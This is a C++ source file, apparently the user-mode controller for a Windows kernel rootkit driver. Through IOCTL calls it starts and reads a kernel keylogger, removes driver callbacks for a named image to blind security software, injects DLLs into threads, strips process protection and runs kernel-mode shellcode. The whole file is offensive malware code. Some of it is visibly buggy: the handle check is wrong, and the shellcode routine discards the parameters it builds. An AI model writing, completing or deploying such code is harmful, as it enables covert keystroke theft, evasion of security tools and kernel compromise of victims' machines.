
#include "pch.h"
#include "RootkitDriver.h"

#include <vector>
#include <winioctl.h>
#include <stdexcept>

RootkitDriver::RootkitDriver() : deviceHandle(INVALID_HANDLE_VALUE) {
	auto handle = CreateFileW(SYMLINK_NAME, GENERIC_READ | GENERIC_WRITE,
		0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (handle == nullptr) {
		throw std::runtime_error("Couldn't open handle device object");
	}
	deviceHandle = Utils::AutoHandle(handle);
}

VOID RootkitDriver::StartKeyloggging() {
	SendIoctl(IOCTL_START_KEYLOGGING, nullptr, 0, nullptr, 0);
}

VOID RootkitDriver::GetKeyloggingData(std::string& KeyData, ULONG BufferSize) {
	char* buf = new char[sizeof(KeyloggingOutputBuffer) + BufferSize];
	auto returnedBytes = SendIoctl(IOCTL_QUERY_KEYLOGGING, nullptr, 0, buf, BufferSize);
	*(buf + returnedBytes) = 0;
	KeyData.append(buf);
}

VOID RootkitDriver::EndKeylogging() {
	SendIoctl(IOCTL_END_KEYLOGGING, nullptr, 0, nullptr, 0);
}

VOID RootkitDriver::RemoveDriverCallbacks(char ImageName[16]) {
	SendIoctl(IOCTL_REMOVE_CALLBACKS, ImageName, sizeof(ImageName), nullptr, 0);
}

VOID RootkitDriver::InjectLibraryToThread(HANDLE Tid, const CHAR* DllPath) {
	InjectLibraryParams input = { Tid, {0} };
	strncpy_s(input.DllPath, DllPath, MAX_PATH_LENGTH);
	SendIoctl(IOCTL_INJECT_LIBRARY_TO_PROCESS, &input, sizeof(InjectLibraryParams), nullptr, 0);
}

VOID RootkitDriver::RemoveProtectionFromProcess(ULONG Pid) {
	RemoveProtectionParams params = { Pid };
	SendIoctl(IOCTL_REMOVE_PROTECTION, &params, sizeof(RemoveProtectionParams), nullptr, 0);
}

VOID RootkitDriver::RestoreProtectionToProcess(ULONG Pid) {
	RestoreProtectionParams params = { Pid };
	try {
		SendIoctl(IOCTL_RESTORE_PROTECTION, &params, sizeof(RestoreProtectionParams), nullptr, 0);
	}
	catch (std::exception& exception) {
		OutputDebugStringA("Process wasn't protected, continuing...\n");
	}
}

DWORD RootkitDriver::RunKmShellcode(KM_SHELLCODE_ROUTINE Shellcode, size_t ShellcodeSize, const PVOID Input, size_t InputLength,
	PVOID Output, ULONG OutputSize) {
	RunKmShellcodeParams params = { Shellcode, ShellcodeSize, Input, InputLength };
	return SendIoctl(IOCTL_RUN_KM_SHELLCODE, Input, InputLength, Output, OutputSize);
}

DWORD RootkitDriver::SendIoctl(ULONG Ioctl, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength) {
	DWORD bytesReturned = 0;
	if (!DeviceIoControl(deviceHandle.get(),
		Ioctl, InputBuffer, InputBufferLength,
		OutputBuffer, OutputBufferLength, &bytesReturned, nullptr)) {
		throw std::runtime_error("Failed to send ioctl");
	}
	return bytesReturned;
}
